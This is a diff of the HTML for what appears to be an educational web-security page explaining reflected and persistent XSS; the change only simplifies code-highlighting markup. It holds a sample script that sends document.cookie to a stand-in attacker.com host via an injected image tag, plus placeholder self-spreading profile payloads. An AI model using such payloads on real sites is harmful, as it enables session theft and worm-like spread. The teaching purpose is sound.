@@ -116,50 +116,22 @@
 Error 404! `path` not found.
 </p>
 <p>An  attacker can then lead a user to opening <code>http://victim.com/attacker_supplied_string</code>, where <code>attacker_supplied_string</code> is:</p>
-<div class="highlight"><div style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
   <span style="color:#00a8c8">let</span> <span style="color:#75af00">addr</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://attacker.com/?&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75af00">escape</span><span style="color:#111">(</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">cookie</span><span style="color:#111">);</span>
   <span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">write</span><span style="color:#111">(</span><span style="color:#d88200">`&lt;img src=&#34;</span><span style="color:#d88200">${</span><span style="color:#75af00">addr</span><span style="color:#d88200">}</span><span style="color:#d88200">&#34; /&gt;`</span><span style="color:#111">);</span>
 <span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Suppose a site uses Force HTTPS. If a <code>&lt;script src=&quot;http://...&quot;&gt;</code> is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!</p>
+</code></pre></div><p>Suppose a site uses Force HTTPS. If a <code>&lt;script src=&quot;http://...&quot;&gt;</code> is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!</p>
 <h2 id="persistent-xss">Persistent XSS</h2>
 <p>Consider a social network that allows creating and editing own profile, and viewing your own and others' profiles.</p>
 <p>If this is the template&hellip;</p>
-<div class="highlight"><div style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
   user_supplied_string
 <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>&hellip; an attacker can do:</p>
-<div class="highlight"><div style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>&hellip; an attacker can do:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
   <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span> <span style="color:#75715e">/* Cookie stealing script. */</span> <span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div>
+</code></pre></div>
 
 
 <div class="comment-holder">
@@ -169,27 +141,14 @@ Error 404! `path` not found.
 
 
 <p>&hellip; or even:</p>
-<div class="highlight"><div style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
   <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
     <span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
       <span style="color:#75715e">/* Code to replace user&#39;s profile with copy of the same code */</span>
     <span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
   <span style="color:#111">&lt;</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The 2005 Myspace Samy &lsquo;worm&rsquo; (more accurately, a virus) replaced users' profiles with the text &lsquo;samy is my hero&rsquo;. It spread to 1m+ users in under a day.</p>
+</code></pre></div><p>The 2005 Myspace Samy &lsquo;worm&rsquo; (more accurately, a virus) replaced users' profiles with the text &lsquo;samy is my hero&rsquo;. It spread to 1m+ users in under a day.</p>
 
         </article>
 
